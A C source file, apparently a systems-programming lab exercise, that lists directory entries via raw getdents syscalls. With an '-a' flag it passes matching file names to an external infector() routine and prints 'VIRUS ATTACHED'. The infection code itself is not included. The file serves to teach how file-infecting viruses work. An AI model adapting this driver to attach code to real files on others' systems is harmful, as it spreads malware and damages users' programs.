#include "util.h"
#include <stdio.h>
#include <stdlib.h>
#define SYS_WRITE 4
#define STDOUT 1
#define SYS_OPEN 5
#define O_RDWR 2
#define SYS_SEEK 19
#define SEEK_SET 0
#define SHIRA_OFFSET 0x291
#define BUFFER_SIZE 12
#define SYS_CLOSE 6
#define SYS_GERDENTS 141
extern int system_call();
extern int infection(int);
extern int infector(char*);

typedef struct ent{
    int inode;
    int offset;
    short len;
    char buf[1];
} ent;

int main (int argc , char* argv[], char* envp[])
{   
    int j;
    int i;
    int count;
    int close;
    int directory;
    char buff[8192];
    ent* entp = (ent*) buff;
    directory = system_call(SYS_OPEN, ".", 0, 0);
    if (directory <0){
        system_call(SYS_WRITE, 1, "\nError opening directory", strlen("\nError opening directory"));  
        system_call(STDOUT, 0x55 , 0, 0);
    }
    count = system_call(SYS_GERDENTS, directory, buff, 8192);
    if (count <0){
        system_call(SYS_WRITE, 1, "\nError reading directory", strlen("\nError reading directory"));   
        system_call(STDOUT, 0x55 , 0, 0);
    } 
    for (i=0; i<count; i += entp->len){
        entp = buff + i;
        system_call(SYS_WRITE, 1, "inode = ", strlen("inode = "));   
        system_call(SYS_WRITE, 1, itoa(entp->inode), strlen(itoa(entp->inode)));
        system_call(SYS_WRITE, 1, "\noffset = ", strlen("\noffset = "));   
        system_call(SYS_WRITE, 1, itoa(entp->offset), strlen(itoa(entp->offset)));
        system_call(SYS_WRITE, 1, "\nlen = ", strlen("\nlen = "));   
        system_call(SYS_WRITE, 1, itoa(entp->len), strlen(itoa(entp->len)));
        system_call(SYS_WRITE, 1, "\nbuf = ", strlen("\nbuf = "));   
        system_call(SYS_WRITE, 1, entp->buf, strlen(entp->buf)); 
        system_call(SYS_WRITE, 1, "\n\n", 2);
    }
    close = system_call(SYS_CLOSE, directory, 0, 0);
    if (close < 0){
        system_call(SYS_WRITE, 1, "\nError closing directory", 24);   
        system_call(STDOUT, 0x55 , 0, 0);
    }
    for(j=1; j<argc; j++){
        if(strncmp("-a", argv[j], 2) == 0){
            directory = system_call(SYS_OPEN, ".", 0, 0);
            if (directory <0){
                system_call(SYS_WRITE, 1, "\nError opening directory", strlen("\nError opening directory"));  
                system_call(STDOUT, 0x55 , 0, 0);
            }
            count = system_call(SYS_GERDENTS, directory, buff, 8192);
            if (count <0){
                system_call(SYS_WRITE, 1, "\nError reading directory", strlen("\nError reading directory"));   
                system_call(STDOUT, 0x55 , 0, 0);
            } 
            for (i=0; i<count; i += entp->len){
                entp = buff + i;
                if(strncmp(argv[j] + 2, entp->buf, strlen(argv[j] + 2))==0){
                    infector(entp->buf); 
                    system_call(SYS_WRITE, 1, entp->buf, strlen(entp->buf)); 
                    system_call(SYS_WRITE, 1, " VIRUS ATTACHED\n", strlen(" VIRUS ATTACHED\n")); 
                }
            }
            close = system_call(SYS_CLOSE, directory, 0, 0);
            if (close < 0){
                system_call(SYS_WRITE, 1, "\nError closing directory", strlen("\nError closing directory"));   
                system_call(STDOUT, 0x55 , 0, 0);
            }
        }
    }
    return 0;
}


